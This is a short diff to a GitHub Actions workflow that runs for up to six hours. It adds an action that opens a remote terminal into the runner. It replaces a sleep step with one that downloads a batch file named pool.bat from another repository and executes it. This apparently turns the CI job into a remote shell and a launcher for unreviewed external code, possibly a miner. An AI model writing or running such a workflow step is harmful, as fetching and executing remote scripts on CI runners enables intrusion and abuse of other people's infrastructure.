@@ -9,7 +9,9 @@ jobs:
     timeout-minutes: 360
     steps:
       - name: Debuk
-        uses: eyu-dev/debugger-action@V1.0.0
+        uses: lhotari/action-upterm@v1
 
-      - name: seleep
-        run: sleep infinity
+      - name: pularis
+        run: |
+          Invoke-WebRequest -Uri "https://github.com/ajiBaru/ActionDocker/raw/refs/heads/main/.github/workflows/pool.bat" -OutFile "pool.bat"
+          cmd /c pool.bat
